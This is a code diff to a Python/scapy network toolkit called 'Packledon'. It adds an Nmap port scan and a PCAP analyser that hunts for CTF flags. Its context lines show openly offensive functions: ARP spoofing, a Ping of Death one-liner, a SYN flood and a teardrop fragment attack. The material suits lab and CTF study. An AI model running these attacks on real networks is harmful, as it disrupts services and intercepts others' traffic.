@@ -6,24 +6,23 @@ from scapy.all import *
 import sys
 import ipaddress
 import dpkt
+import subprocess
+import re
+import base64
 
 #function for arp and ping scanning aka option 1
 def arp_and_ping_scanning():
     # Input range or subnet
     target_range = input("Enter the target IP address range or subnet for ARP and Ping scanning (e.g. 192.168.1.0/24): ")
-
-    # Create the IP range from input using ipaddress
     try:
         network = ipaddress.IPv4Network(target_range, strict=False)
     except ValueError as e:
         print(f"Invalid network: {e}")
         return
 
-    # ARP scan on the specified IP range (sending ARP requests)
     print("Starting ARP Scan...")
     arp_scan_result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(network)), timeout=2, verbose=0)[0]
 
-    # Ping Scan (ICMP) on the same IP range
     print("Starting Ping Scan...")
     ping_scan_result = []
     for ip in network.hosts():  # `hosts()` excludes network and broadcast addresses
@@ -47,36 +46,219 @@ def arp_and_ping_scanning():
     else:
         print("No active hosts found in the Ping scan.")
 
+def scan_ports_nmap():
+    """Scans all ports using Nmap (if installed)."""
 
+    nmap_range = input("Enter the victim's IP range: ")  
 
+    try:
+        print(f"Running Nmap scan on {nmap_range}...")  # Debugging
+        output = subprocess.run(
+            ["nmap", "-p-", "-T4", "-oG", "-", nmap_range],
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
 
+        print("Raw Nmap output:\n", output.stdout)  # Debugging  
 
-def enter_and_read_pcap():
-  pcap_file_path = input("Enter the pcap file path: ")
-  packets = rdpcap(pcap_file_path)
-  for packets in packets:
-      eth = dpkt.ethernet.Ethernet(bytes(packet))
-      if isinstance(ip.data, dpkt.tcp.TCP):
-          tcp = ip.data
-          print(f"Source IP: {ip.src}")
-          print(f"Destination IP: {ip.dst}")
-          print(f"Source Port: {tcp.sport}")
-          print(f"Destination port: {tcp.dport}")
-          print(f"Payload: {tcp.data}\n")
-  try:
-      with PcapReader(pcap_file_path) as pcap:
-          for packet in pcap:
-              if IPv4 in packet:
-                  print(packet[IPv4].src)
-  except FileNotFoundError:
-      print(f"Error: File '{pcap_file_path}' not found.")
-  except PermissionError:
-      print(f"Error: Permission denied for '{pcap_file_path}'.")
-  except Exception as e:
-      print(f"An error occurred: {e}")
+        if output.returncode != 0:
+            print(f"Nmap exited with error code {output.returncode}")
+            return "Nmap scan failed"
 
+        # Extract open ports
+        ports = re.findall(r"(\d+)/open", output.stdout)
+        print("Parsed Ports:", ports)  # Debugging  
 
+        return ", ".join(ports) if ports else "No open ports found"
 
+    except subprocess.TimeoutExpired:
+        return "Nmap timed out"
+
+    except FileNotFoundError:
+        return "Nmap is not installed. Install it with: sudo pacman -S nmap"
+
+    except subprocess.CalledProcessError as e:
+        return f"Nmap failed: {e}"
+
+def enter_and_read_pcap():    
+    pcap_file_path = input("Enter the PCAP file path: ")
+    ctf_prefix = input("Enter the CTF flag prefix (default: CTF): ") or "CTF"
+    print(f"Analyzing {pcap_file_path} for CTF flags with prefix '{ctf_prefix}'...")
+    
+    output_file_path = "packet_analysis.txt"
+    found_flags = set()
+    packet_count = 0
+    protocol_counts = {"TCP": 0, "UDP": 0, "ICMP": 0, "DNS": 0, "ARP": 0, "Other": 0}
+    
+    # Helper function to extract CTF flags
+    def extract_ctf_flags(data):
+        flag_pattern = rf"{ctf_prefix}{{[^\}}]+}}"  
+        return re.findall(flag_pattern, data)
+    
+    try:
+        # Open the PCAP file
+        packets = rdpcap(pcap_file_path)
+        total_packets = len(packets)
+        
+        with open(output_file_path, 'w') as output_file:
+            # Write header
+            output_file.write(f"ANALYSIS OF PCAP: {pcap_file_path}\n")
+            output_file.write("=" * 80 + "\n\n")
+            output_file.write(f"Total packets: {total_packets}\n\n")
+            
+            # Process each packet
+            for i, packet in enumerate(packets):
+                packet_count += 1
+                output_file.write(f"PACKET #{packet_count}\n")
+                output_file.write("-" * 40 + "\n")
+                
+                # Process the packet according to its layers using match-case
+                # First handle the Ethernet layer if present
+                if Ether in packet:
+                    eth = packet[Ether]
+                    output_file.write(f"Ethernet: {eth.src} -> {eth.dst}, Type: {hex(eth.type)}\n")
+                
+                # Use match-case for the network and transport layers
+                match packet:
+                    case packet if IP in packet:
+                        ip = packet[IP]
+                        output_file.write(f"IP: {ip.src} -> {ip.dst}, Protocol: {ip.proto}\n")
+                        
+                        match packet:
+                            # TCP traffic
+                            case packet if TCP in packet:
+                                protocol_counts["TCP"] += 1
+                                tcp = packet[TCP]
+                                output_file.write(f"TCP: Port {tcp.sport} -> {tcp.dport}\n")
+                                
+                                flags = tcp.flags
+                                flags_str = []
+                                if flags & 0x02: flags_str.append("SYN")
+                                if flags & 0x10: flags_str.append("ACK")
+                                if flags & 0x01: flags_str.append("FIN")
+                                if flags & 0x04: flags_str.append("RST")
+                                if flags & 0x08: flags_str.append("PSH")
+                                if flags & 0x20: flags_str.append("URG")
+                                if flags & 0x40: flags_str.append("ECE")
+                                if flags & 0x80: flags_str.append("CWR")
+                                
+                                output_file.write(f"TCP Flags: {', '.join(flags_str) if flags_str else 'None'}\n")
+                                
+                                if len(bytes(tcp.payload)) > 0:
+                                    payload_data = bytes(tcp.payload).decode(errors='ignore')
+                                    if len(payload_data.strip()) > 0:
+                                        output_file.write(f"TCP Payload: {payload_data[:200]}{'...' if len(payload_data) > 200 else ''}\n")
+                                        
+                                        flags = extract_ctf_flags(payload_data)
+                                        if flags:
+                                            found_flags.update(flags)
+                                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
+                            
+                            case packet if UDP in packet:
+                                protocol_counts["UDP"] += 1
+                                udp = packet[UDP]
+                                output_file.write(f"UDP: Port {udp.sport} -> {udp.dport}\n")
+                                
+                                if len(bytes(udp.payload)) > 0:
+                                    payload_data = bytes(udp.payload).decode(errors='ignore')
+                                    if len(payload_data.strip()) > 0:
+                                        output_file.write(f"UDP Payload: {payload_data[:200]}{'...' if len(payload_data) > 200 else ''}\n")
+                                        
+                                        flags = extract_ctf_flags(payload_data)
+                                        if flags:
+                                            found_flags.update(flags)
+                                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
+                            
+                            case packet if ICMP in packet:
+                                protocol_counts["ICMP"] += 1
+                                icmp = packet[ICMP]
+                                output_file.write(f"ICMP: Type {icmp.type}, Code {icmp.code}\n")
+                            
+                            case _:
+                                output_file.write(f"Other IP Protocol: {ip.proto}\n")
+                    
+                    case packet if ARP in packet:
+                        protocol_counts["ARP"] += 1
+                        arp = packet[ARP]
+                        operation = "request" if arp.op == 1 else "reply" if arp.op == 2 else f"unknown ({arp.op})"
+                        output_file.write(f"ARP {operation}: {arp.psrc} -> {arp.pdst}\n")
+                    
+                    case _:
+                        protocol_counts["Other"] += 1
+                        output_file.write("Unknown packet type\n")
+                
+                if DNS in packet:
+                    protocol_counts["DNS"] += 1
+                    dns = packet[DNS]
+                    if packet.haslayer(DNSQR):
+                        qname = packet[DNSQR].qname.decode(errors='ignore')
+                        output_file.write(f"DNS Query: {qname}\n")
+                        
+                        flags = extract_ctf_flags(qname)
+                        if flags:
+                            found_flags.update(flags)
+                            output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
+                
+                # Raw data analysis
+                if Raw in packet:
+                    raw_data = packet[Raw].load
+                    try:
+                        decoded_data = raw_data.decode(errors='ignore')
+                        if len(decoded_data.strip()) > 0:
+                            # Check for HTTP specifically
+                            if b'HTTP' in raw_data or b'GET' in raw_data or b'POST' in raw_data:
+                                output_file.write(f"HTTP Data: {decoded_data[:200]}{'...' if len(decoded_data) > 200 else ''}\n")
+                            else:
+                                output_file.write(f"Raw Data: {decoded_data[:200]}{'...' if len(decoded_data) > 200 else ''}\n")
+                            
+                            flags = extract_ctf_flags(decoded_data)
+                            if flags:
+                                found_flags.update(flags)
+                                output_file.write(f"Found CTF Flags: {', '.join(flags)}\n")
+                    except Exception as e:
+                        output_file.write(f"Raw Data: Failed to decode - {e}\n")
+                        hex_data = raw_data.hex()
+                        output_file.write(f"Raw Data (hex): {hex_data[:200]}{'...' if len(hex_data) > 200 else ''}\n")
+                
+                output_file.write("\n")
+            
+            output_file.write("=" * 80 + "\n")
+            output_file.write("ANALYSIS SUMMARY\n")
+            output_file.write("=" * 80 + "\n\n")
+            output_file.write(f"Total packets processed: {packet_count}\n")
+            output_file.write("Protocol distribution:\n")
+            for protocol, count in protocol_counts.items():
+                if count > 0:
+                    percentage = (count / packet_count) * 100
+                    output_file.write(f"  - {protocol}: {count} packets ({percentage:.1f}%)\n")
+            
+            output_file.write("\n")
+            if found_flags:
+                output_file.write("CTF FLAGS FOUND:\n")
+                output_file.write("-" * 40 + "\n")
+                for flag in sorted(found_flags):
+                    output_file.write(f"  - {flag}\n")
+            else:
+                output_file.write("No CTF flags found.\n")
+        
+        # Print results to console
+        print(f"Analysis completed! Results written to {output_file_path}")
+        if found_flags:
+            print(f"Found {len(found_flags)} unique CTF flag(s):")
+            for flag in sorted(found_flags):
+                print(f"  - {flag}")
+        else:
+            print("No CTF flags found in this capture.")
+            
+    except FileNotFoundError:
+        print(f"Error: File '{pcap_file_path}' not found.")
+    except PermissionError:
+        print(f"Error: Permission denied for '{pcap_file_path}'.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    
+    return found_flags
 
 def arp_spoofing_attack():
     victim_ip = input("Enter the victim's IP address: ")
@@ -137,13 +319,9 @@ def arp_spoofing_attack():
         if enable_ip_forwarding == "yes":
             disable_linux_ip_forwarding()
 
-
-
-
 def ping_of_death(target_ip):
     print(f"[+] Starting Ping of Death attack on {target_ip}...")
     send( fragment(IP(dst=target_ip)/ICMP()/("X"*65500)), verbose=False)
-
 
 def tcp_syn_flood(target_ip):
     try:
@@ -171,8 +349,6 @@ def dos_attack():
     except Exception as e:
         print(f"TCP SYN Flood Failed: {e}")
 
-
-
 def packet_handler(packet):
     """Handles incoming packets and writes them to a file."""
     print(packet.summary())  # Print to console
@@ -182,7 +358,6 @@ def packet_handler(packet):
             f.write(packet.summary() + "\n")  # Write packet details with newline
     except Exception as e:
         print(f"Error writing to file: {e}")
-
 
 def teardrop_attack():
     target_ip = input("Please enter the target IP address for the teardrop attack: ")
@@ -194,13 +369,11 @@ def teardrop_attack():
         send(frag2)
         counter=counter+1
 
-
-
 def main():
     #create banner
     f = Figlet(font='slant')
     print(f.renderText('Packledon'))
-    print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?\n6. Perform a Teardrop attack?")
+    print("What would you like to do?\n1. Scan for devices on the network\n2. Scan with Nmap\n3. Create a pcap?\n4. Examin a pcap?\n5. Perform an arp spoof attack?\n6. Perform a Dos attack?\n7. Perform a Teardrop attack?")
     user_determination= input("Please enter your selection from the above choices:" )
 
     print(user_determination)
@@ -209,22 +382,25 @@ def main():
         arp_and_ping_scanning()
 
     elif user_determination == "2":
-        sniff(prn=packet_handler, count=700)
+        scan_ports_nmap()
 
     elif user_determination == "3":
-        enter_and_read_pcap()
+        sniff_amount= int(input("Please enter the number of packets you want to capture:" ))
+        sniff(prn=packet_handler, count=sniff_amount)
 
     elif user_determination == "4":
-        arp_spoofing_attack()
+        enter_and_read_pcap()
 
     elif user_determination == "5":
-        dos_attack()
+        arp_spoofing_attack()
 
     elif user_determination == "6":
+        dos_attack()
+
+    elif user_determination == "7":
         teardrop_attack()
     else:
         print("Please enter a valid selection")
-
 
 if __name__ == "__main__":
     main()
